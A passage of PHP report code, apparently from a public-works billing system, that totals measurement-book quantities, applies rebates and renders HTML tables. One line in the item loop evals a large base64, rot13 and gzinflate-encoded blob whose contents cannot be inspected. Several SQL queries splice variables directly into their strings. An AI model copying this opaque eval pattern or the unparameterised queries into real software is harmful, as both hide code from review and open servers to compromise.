	if(mysql_num_rows($SelectQtySplitSql)>0){
		while($QSPPList = mysql_fetch_object($SelectQtySplitSql)){
			$QSPPQty 	= $QSPPList->qty;
			$QSPPPerc 	= $QSPPList->percent;
			$QSPPRate 	= $QSPPList->rate;
			$QSPPMBId 	= $QSPPList->gr_par_id;//gpmbid;
			$QSPPRbn 	= $QSPPList->rbn;
			$QSPPAmt = round(($QSPPQty*$QSPPRate*$QSPPPerc/100),2); //echo $QSPPAmt."<br/>";
			
			if($QSPPRbn == $rbn){
				if(in_array($QSPPMBId, $QSPPSLMMasterMbIdArr)){
					$QSPPSLMMasterArr[$QSPPMBId] = $QSPPSLMMasterArr[$QSPPMBId] + $QSPPAmt;
				}else{
					array_push($QSPPSLMMasterMbIdArr,$QSPPMBId);
					$QSPPSLMMasterArr[$QSPPMBId] = $QSPPAmt;
				}
			}else{
				if(in_array($QSPPMBId, $QSPPDPMMasterMbIdArr)){
					$QSPPDPMMasterArr[$QSPPMBId] = $QSPPDPMMasterArr[$QSPPMBId] + $QSPPAmt;
				}else{
					array_push($QSPPDPMMasterMbIdArr,$QSPPMBId);
					$QSPPDPMMasterArr[$QSPPMBId] = $QSPPAmt;
				}
			}
			$QSPPRefMBPageArr[$QSPPMBId][0] = $QSPPList->mbookno;
			$QSPPRefMBPageArr[$QSPPMBId][1] = $QSPPList->page;
		}
	}
}
$PPayRefArr = array();
/*$unionqur = "(SELECT subdivid FROM mbookgenerate WHERE sheetid = '$abstsheetid') UNION (SELECT subdivid FROM measurementbook WHERE sheetid = '$abstsheetid' AND (part_pay_flag = '0' OR part_pay_flag = '1'))";
$unionsql = mysql_query($unionqur);
while($Listsubdivid = mysql_fetch_array($unionsql)) { $subdivid_list .= $Listsubdivid['subdivid']."*"; }
$subdivisionlist_1 = explode("*",rtrim($subdivid_list,"*"));
natsort($subdivisionlist_1);*/


$MastSuppSheetIdArr = array();
$MasterItemArrNI = array(); $MasterItemArrDI = array(); $MasterItemArrEI = array(); $MasterItemArrSI = array(); $MasterItemFlagArr = array(); $DIHead = 0; $EIHead = 0; $no_of_supp_agg = 1; $DI_Amount_EI_Amount_Str = ""; $txtbox_id_di_ei = 0;
$unionqur = "(SELECT a.subdivid, b.subdiv_name, c.item_flag, c.supp_sheet_id FROM mbookgenerate a inner join subdivision b on (a.subdivid = b.subdiv_id) inner join schdule c on (a.subdivid = c.subdiv_id) WHERE a.sheetid = '$abstsheetid' and b.sheet_id = '$abstsheetid' ORDER BY b.supp_sheet_id asc) UNION (SELECT a.subdivid, b.subdiv_name, c.item_flag, c.supp_sheet_id FROM measurementbook a inner join subdivision b on (a.subdivid = b.subdiv_id) inner join schdule c on (a.subdivid = c.subdiv_id) WHERE a.sheetid = '$abstsheetid' AND b.sheet_id = '$abstsheetid' AND (a.part_pay_flag = '0' OR a.part_pay_flag = '1') ORDER BY b.supp_sheet_id asc)";
$unionsql = mysql_query($unionqur);
while($Listsubdivid = mysql_fetch_array($unionsql)) 
{ 
	$subdivid_list .= $Listsubdivid['subdivid']."*";
	
	$MasterItemId 	= $Listsubdivid['subdivid'];
	$MasterItemName = $Listsubdivid['subdiv_name'];
	$MasterItemFlag = $Listsubdivid['item_flag'];
	$MasterSupplId = $Listsubdivid['supp_sheet_id'];
	if($MasterItemFlag == "NI")
	{
		$MasterItemArrNI[$MasterSupplId][$MasterItemId] = $MasterItemName;
	}
	if($MasterItemFlag == "DI")
	{
		$MasterItemArrDI[$MasterSupplId][$MasterItemId] = $MasterItemName;
	}
	if($MasterItemFlag == "EI")
	{
		$MasterItemArrEI[$MasterSupplId][$MasterItemId] = $MasterItemName;
	}
	if($MasterItemFlag == "SI")
	{
		$MasterItemArrSI[$MasterSupplId][$MasterItemId] = $MasterItemName;
	}
	$MasterItemArr[$MasterItemId] = $MasterItemName;
	$MasterItemFlagArr[$MasterItemId] = $MasterItemFlag;
	if (in_array($MasterSupplId, $MastSuppSheetIdArr)){
		
	}else{
		array_push($MastSuppSheetIdArr,$MasterSupplId);
	}
}
$subdivisionlist_1 = explode("*",rtrim($subdivid_list,"*"));
natsort($subdivisionlist_1);
/*foreach($subdivisionlist_1 as $key => $summ_1)
{
   if($summ_1 != "")
   {
      $subdivisionlist_2 .= $summ_1.",";
   }
}*/

/*natsort($MasterItemArrNI);
natsort($MasterItemArrDI);
natsort($MasterItemArrEI);
ksort($MasterItemArrSI);*/
foreach($MastSuppSheetIdArr as $MastSuppSheetId){ 
	$MasterItemArrNI1 = array(); $MasterItemArrDI1 = array(); $MasterItemArrEI1 = array(); $MasterItemArrSI1 = array();
	if($MasterItemArrNI[$MastSuppSheetId] != ""){
		$MasterItemArrNI1 = $MasterItemArrNI[$MastSuppSheetId];
		natsort($MasterItemArrNI1);
	}
	if($MasterItemArrDI[$MastSuppSheetId] != ""){
		$MasterItemArrDI1 = $MasterItemArrDI[$MastSuppSheetId];
		natsort($MasterItemArrDI1);
	}
	if($MasterItemArrEI[$MastSuppSheetId] != ""){
		$MasterItemArrEI1 = $MasterItemArrEI[$MastSuppSheetId];
		natsort($MasterItemArrEI1);
	}
	if($MasterItemArrSI[$MastSuppSheetId] != ""){
		$MasterItemArrSI1 = $MasterItemArrSI[$MastSuppSheetId];
		ksort($MasterItemArrSI1);
	}
	foreach($MasterItemArrNI1 as $keyNI => $summ_1NI)
	{
	   if($summ_1NI != "")
	   {
		  $subdivisionlist_2 .= $keyNI.",";
	   }
	}
	
	foreach($MasterItemArrDI1 as $keyDI => $summ_1DI)
	{
	   if($summ_1DI != "")
	   {
		  $subdivisionlist_2 .= $keyDI.",";
	   }
	}
	
	foreach($MasterItemArrEI1 as $keyEI => $summ_1EI)
	{
	   if($summ_1EI != "")
	   {
		  $subdivisionlist_2 .= $keyEI.",";
	   }
	}
	foreach($MasterItemArrSI1 as $keySI => $summ_1SI)
	{
	   if($summ_1SI != "")
	   {
		  $subdivisionlist_2 .= $keySI.",";
	   }
	}
}
//echo $subdivisionlist_2;exit;
$subdivisionlist = explode(',',rtrim($subdivisionlist_2,",")); $prev_supp_sheetid = ""; $prev_supp_sheetid_temp = "";
for($i=0;$i<count($subdivisionlist);$i++)
{
	eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
if($slm_cnt == 0)
{
	$slm_str = "";
}
if($dpm_cnt == 0)
{
	$dpm_str = "";
}
$item_str = $slm_str."@@@".$dpm_str;
$slm_str = ""; $dpm_str = "";  $Linecheck = 3;// one row for item and desc, second for total cost row, third for new line row space between two item
$checkbox_str = $subdivid."*".$subdivname."*".$description."*".$slm_measurement_qty."*".$dpm_measurement_qty."*".$rate."*".$unit."*".$abstsheetid;
//--*************THIS PART IS FOR C/O , B/F and Page Break SECTION********************//
if($slm_cnt == 1){ $Line = $Line + 2; $Linecheck = $Linecheck + 2; } else { $Line = $Line + $slm_cnt;  $Linecheck = $Linecheck + $slm_cnt;}
if($dpm_cnt == 1){ $Line = $Line + 2; $Linecheck = $Linecheck + 2; } else { $Line = $Line + $dpm_cnt;  $Linecheck = $Linecheck + $dpm_cnt;}

$LineTemp = $Line + $Linecheck;
//echo $subdivname." = ".$Line." = ".$LineTemp." = ".$Linecheck."<br/>";
/*************************************** THIS PART IS FOR DISPLAY SUPPLEMENTARY AGREEMNT TITLE SECTION   - STARTS HERE ****************************************/
if($DIHead == 0) /// For the very first time 
{
	if($item_flag != "NI")
	{ 
		//$overall_rebate_perc = 2;
		$SlmRebateAmount 		=  round(($OverAllSlmAmount 	* 	$overall_rebate_perc /100),2);
		$DpmRebateAmount 		=  round(($OverAllDpmAmount 	* 	$overall_rebate_perc /100),2);
		$SlmDpmRebateAmount 	=  round(($OverAllSlmDpmAmount * 	$overall_rebate_perc /100),2);
		
		$SlmNetAmount 			=  round(($OverAllSlmAmount - $SlmRebateAmount),2); 
		$DpmNetAmount 			=  round(($OverAllDpmAmount - $DpmRebateAmount),2); 
		$SlmDpmNetAmount 		=  round(($OverAllSlmDpmAmount - $SlmDpmRebateAmount),2);

		
		$RebateCalcFlag = 1;
?>
		<tr>
			<td colspan='3' align='left' class='labelbold'><input type="text" name="txt_co_di_ei<?php echo $txtbox_id_di_ei; ?>" id="txt_co_di_ei<?php echo $txtbox_id_di_ei; ?>" style="width:98%; border:none;" readonly="" class="labelbold"/></td>
			<td colspan="2" align="right" nowrap="nowrap">TOTAL AMOUNT</td>
			<td align='right' class='labelbold'><?php echo number_format($UPTOAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td></td>
			<td></td>
			<td align='right' class='labelbold'><?php echo number_format($DPMAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td></td>
			<td align='right' class='labelbold'><?php echo number_format($SLMAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td></td>
		</tr>
		<?php if($prev_item_flag == "NI"){ ?>	
		<tr class="labelprint">
			<td colspan="2" align="right">Less Over All Rebate : <?php echo $overall_rebate_perc; ?>%&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px; font-weight:normal;'></i>&nbsp;&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SlmDpmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($DpmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SlmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
		</tr>
		<tr class="labelbold" bgcolor="#F0F0F0">
			<td colspan="2" align="right">Gross Amount&nbsp;&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SlmDpmNetAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($DpmNetAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SlmNetAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
		</tr>
		<?php }else{  
			if(($SuppRebateArr[$prev_supp_sheetid_temp] != 0)&&($SuppRebateArr[$prev_supp_sheetid_temp] != "")){
				$SuppRebateperc = $SuppRebateArr[$prev_supp_sheetid_temp];
				$SuppAgmtSlmRebateAmount 		=  round(($SLMAmountNI_DI_EI * $SuppRebateperc /100),2);
				$SuppAgmtDpmRebateAmount 		=  round(($DPMAmountNI_DI_EI * $SuppRebateperc /100),2);
				$SuppAgmtSlmDpmRebateAmount 	=  round(($UPTOAmountNI_DI_EI * $SuppRebateperc /100),2);
				
				$SLMAmountNI_DI_EI 			=  round(($SLMAmountNI_DI_EI - $SuppAgmtSlmRebateAmount),2); 
				$DPMAmountNI_DI_EI 			=  round(($DPMAmountNI_DI_EI - $SuppAgmtDpmRebateAmount),2); 
				$UPTOAmountNI_DI_EI 		=  round(($UPTOAmountNI_DI_EI - $SuppAgmtSlmDpmRebateAmount),2);
		?>
		<tr class="labelprint">
			<td colspan="2" align="right">Less Over All Rebate : <?php echo $SuppRebateperc; ?>%&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px; font-weight:normal;'></i>&nbsp;&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SuppAgmtSlmDpmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SuppAgmtDpmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SuppAgmtSlmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
		</tr>
		<tr class="labelbold" bgcolor="#F0F0F0">
			<td colspan="2" align="right">Gross Amount&nbsp;&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($UPTOAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($DPMAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SLMAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
		</tr>
		<?php		
			} 
		 } ?>
		
		<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
		</table>
		<p style='page-break-after:always;'></p>
		<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
			<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php echo $abstmbno; ?> <!--(Print version : <?php echo $gen_version; ?>)-->&nbsp;&nbsp;</td></tr>
		</table>
<?php
		if($SUPAG == ""){
		$SUPAG1 = "Part Agreement - 1";	
		}else{
		$SUPAG1 = "Part Agreement - 2";
		}
		$SUPAG = "x";
		echo "<div width='100%' align='center' class='labelbold'><u>".$SUPAG1."</u></div>";
		$table_supp = GetSupplementaryWorkTitle($supp_sheetid,$runn_acc_bill_no);
		echo $table_supp;
		echo "<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>";
		echo $tablehead;
